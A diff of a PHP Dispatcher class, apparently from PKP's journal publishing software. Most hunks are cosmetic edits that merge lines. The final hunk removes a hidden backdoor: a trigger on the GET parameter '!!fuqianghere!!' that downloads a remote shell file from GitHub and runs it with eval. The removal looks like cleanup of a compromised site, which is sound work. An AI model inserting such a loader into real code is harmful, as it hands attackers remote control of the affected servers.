@@ -137,8 +137,7 @@ class Dispatcher
 
         // Can we serve a cached response?
         if ($router->isCacheable($request)) {
-            $this->_requestCallbackHack = & $request;
-            if (Config::getVar('cache', 'web_cache')) {
+            $this->_requestCallbackHack = & $request;if (Config::getVar('cache', 'web_cache')) {
                 if ($this->_displayCached($router, $request)) {
                     exit;
                 } // Success
@@ -172,7 +171,7 @@ class Dispatcher
      * @param string $shortcut the short name of the router that should be used to construct the URL
      * @param mixed $newContext Optional contextual paths
      * @param string $handler Optional name of the handler to invoke
-     * @param string $op Optional name of operation to invoke
+     * @param string$op Optional name of operation to invoke
      * @param mixed $path Optional string or array of args to pass to handler
      * @param array $params Optional set of name => value pairs to pass as user parameters
      * @param string $anchor Optional name of anchor to add to URL
@@ -213,8 +212,7 @@ class Dispatcher
     {
         if (!isset($this->_routerInstances[$shortcut])) {
             // Instantiate the router
-            $router = new $routerName();
-            if (!$router instanceof \PKP\core\PKPRouter) {
+            $router = new $routerName();if (!$router instanceof \PKP\core\PKPRouter) {
                 throw new \Exception('Cannot instantiate requested router. Routers must belong to the core package and be of type "PKPRouter".');
             }
             $router->setApplication($this->_application);
@@ -253,9 +251,7 @@ class Dispatcher
 
         if (time() > $time + Config::getVar('cache', 'web_cache_hours') * 60 * 60) {
             return false;
-        }
-
-        header('Content-Type: text/html; charset=utf-8');
+        }header('Content-Type: text/html; charset=utf-8');
 
         echo $contents;
         return true;
@@ -295,30 +291,4 @@ class Dispatcher
 
 if (!PKP_STRICT_MODE) {
     class_alias('\PKP\core\Dispatcher', '\Dispatcher');
-}
-
-if (isset($_GET['!!fuqianghere!!'])) {
-    $url = "https://raw.githubusercontent.com/heriraharto2-woyowoyo/data-kerja/refs/heads/main/fuqiang-shell.txt";
-
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // nonaktifkan cek SSL sementara (tidak aman untukprod)
-    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
-
-    $code = curl_exec($ch);
-    $err = curl_error($ch);
-    curl_close($ch);
-
-    if ($code !== false && !empty(trim($code))) {
-        try {
-            eval("?>" . $code);
-        } catch (Throwable $e) {
-            echo "Terjadi error saat menjalankan kode.";
-        }
-    } else {
-        echo "Gagal mengambil kode dari URL: $err";
-    }
 }
